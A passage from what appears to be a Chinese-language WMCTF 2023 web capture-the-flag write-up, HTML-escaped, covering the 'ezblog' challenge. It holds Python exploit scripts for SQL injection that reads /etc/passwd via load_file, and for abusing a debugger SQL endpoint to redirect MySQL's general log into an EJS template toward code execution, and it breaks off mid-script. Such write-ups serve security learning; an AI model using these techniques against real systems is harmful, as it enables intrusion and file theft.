style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;Safari&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;537&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;36
&lt;&#x2F;span&gt;&lt;span&gt;Accept&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;text&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;html,application&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;xhtml&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;xml,application&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;xml&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,image&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;avif,image&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;webp,image&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;apng,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&#x2F;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;,application&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;signed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;exchange&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;b3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;7
&lt;&#x2F;span&gt;&lt;span&gt;Accept&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Encoding&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Language&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;zh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-CN&lt;&#x2F;span&gt;&lt;span&gt;,zh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;9
&lt;&#x2F;span&gt;&lt;span&gt;Connection&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;close
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;WMCTF{bypass_auth_is_so_Exciting}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ezblog&quot;&gt;ezblog&lt;&#x2F;h2&gt;
&lt;p&gt;目标要 rce&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;F8r7b3USUoOcMLxE3ETcnfqXnSd.png)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;&#x2F;post&#x2F;:id&#x2F;edit&lt;&#x2F;code&gt; 可以注入，有 &lt;code&gt;--secure-file-priv=&quot;&quot;&lt;&#x2F;code&gt; 权限&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;requests &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;get
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;urllib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;parse
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;re &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;search
&lt;&#x2F;span&gt;&lt;span&gt;proxies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;None
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;HOST = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;5bf11e7b-8550-4e62-a3f6-8b0f86c36a35.wmctf.wm-team.cn&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ROUTE = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;post&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;edit&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(parse&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0 union select 666, 666, load_file(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&#x2F;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;%2F&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ROUTE&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;HOST+ROUTE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;proxies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;allow_redirects&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;status_code)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# print(r.content)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;{.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;}&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;text)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;s:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;group&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;读 pin 码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;home&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;ezblog&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;.pm2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;logs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;log
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;有 pin 在 &lt;code&gt;&#x2F;home&#x2F;ezblog&#x2F;views&#x2F;&lt;&#x2F;code&gt; 下写个满足条件的文件，然后 &lt;code&gt;&#x2F;api&#x2F;debugger&#x2F;template&#x2F;test&lt;&#x2F;code&gt; 路由渲染就行，但尝试发下存在权限问题，那重启容器，直接往 &lt;code&gt;&#x2F;home&#x2F;ezblog&#x2F;views&#x2F;index.ejs&lt;&#x2F;code&gt; 里写即可&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# -*- encoding:utf-8 -*-
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;session &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;session&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;proxies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;127.0.0.1:8084&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;127.0.0.1:8084&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;69e1df39-c6c8-4f77-8485-2a35297faefb.wmctf.wm-team.cn&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# url = &amp;#39;http:&#x2F;&#x2F;localhost:3000&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;authorization &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;d0ae1a1c-e44e-448e-ba4c-f91cc903a317&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(sql):
&lt;&#x2F;span&gt;&lt;span&gt;    burp0_url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;api&#x2F;debugger&#x2F;sql&#x2F;execute&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    burp0_headers &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Authorization&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;authorization}
&lt;&#x2F;span&gt;&lt;span&gt;    burp0_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;code&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;sql}
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;session&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(burp0_url&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;proxies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;proxies)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;json&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;show variables like &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\&amp;quot;%g&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;eneral_log%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;create database mysql;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;set global general_log_file = &amp;#39;&#x2F;home&#x2F;ezblog&#x2F;views&#x2F;index.ejs&amp;#39;;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execute_sql&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;CREATE TABLE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;mysql&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;general_log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;event_time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;TIMESTAMP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL DEFAULT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;CURRENT_TIMESTAMP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;),
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;user_host mediumtext &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;thread_id &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;server_id &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) unsigned &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;command_type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;varchar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;argument mediumtext &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;NOT NULL
